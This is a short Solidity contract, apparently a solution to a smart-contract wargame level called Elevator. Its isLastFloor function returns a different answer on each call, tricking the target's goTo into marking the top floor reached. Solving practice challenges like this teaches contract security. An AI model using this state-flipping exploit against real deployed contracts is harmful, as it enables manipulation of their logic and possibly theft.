// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint _floor) external;
}


contract ElevatorAttack {
  IElevator immutable elevatorContract;
  bool _isLastFloor = true;
  constructor(address _elevatorAddr) {
    elevatorContract = IElevator(_elevatorAddr);
  }
  function isLastFloor(uint _floor) external returns (bool) {
    _isLastFloor = !_isLastFloor;
    return _isLastFloor;
  }
  function attack() external {
    elevatorContract.goTo(1);
  }
}